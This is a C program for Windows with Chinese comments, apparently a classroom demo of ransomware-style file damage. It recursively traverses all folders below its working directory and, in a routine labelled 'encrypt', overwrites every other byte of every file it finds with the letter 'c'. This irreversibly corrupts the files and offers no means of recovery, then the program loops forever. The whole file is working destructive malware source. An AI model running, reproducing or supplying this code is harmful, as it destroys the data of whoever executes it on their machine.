#include <stdio.h>
#include <windows.h>
//遍历文件夹
void findFile(char* pathName);

void jiami(char* fileName);


int main(){

	char currentDir[MAX_PATH] = { 0 };

	GetCurrentDirectory(MAX_PATH, currentDir);

	findFile(currentDir);


//	jiami("1.txt");


	while (1);
	return 0;
}



//遍历文件夹
void findFile(char* pathName){
	//1 找pathName文件夹下第一个文件
	//1.1 准备好文件名及其路径
	char fileName[MAX_PATH] = { 0 };//windows操作系统下文件名大小最大260
	sprintf(fileName, "%s\\*.*", pathName);//*对应任意个任意字符
	
	//1.2 找文件
	WIN32_FIND_DATA findData;
	HANDLE hFile = FindFirstFile(fileName, &findData);
	if (INVALID_HANDLE_VALUE == hFile){
		return;
	}
	char temp[MAX_PATH];
	int ret = 1;
	while (ret){
		if (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY){
			//2 是文件夹
			if (findData.cFileName[0] != '.'){//排除掉. 和 ..
				//2.1 把文件夹的名字加到路径后头
				memset(temp, 0, MAX_PATH);//清空数组
				sprintf(temp, "%s\\%s", pathName, findData.cFileName);
				printf("文件夹:%s\n", temp);
				//2.2 遍历文件夹下文件
				findFile(temp);
			}
			
		}
		else{
			//3 是文件
			//3.1 把文件名加到路径后头
			memset(temp, 0, MAX_PATH);//清空数组
			sprintf(temp, "%s\\%s", pathName, findData.cFileName);
			printf("文件:%s\n", temp);
			//3.2 为所欲为
			jiami(temp);
		}

		//4 找下一个
		ret = FindNextFile(hFile, &findData);
		//if (!ret) break;
	}
}

void jiami(char* fileName){
	//1. 打开文件
	FILE* fp = fopen(fileName, "r+b");//二进制读写方式打开文件
	if (fp == NULL){
		return;
	}
	//2. 加密
	//2.1 获取文件大小
	fseek(fp, 0, SEEK_END);//设置文件内容指针到文件末尾
	int size = ftell(fp);//获取文件内容指针距离文件头的字节数
	fseek(fp, 0, SEEK_SET);//设置文件内容指针到文件头
	//2.2 隔一个字节插入一个字节
	char c = 'c';
	for (int i = 0; i < size; i++){
		fwrite(&c, 1, 1, fp);//写入一个字节到文件中
		fseek(fp, 1, SEEK_CUR);
	}


	//3. 关闭文件
	fclose(fp);
}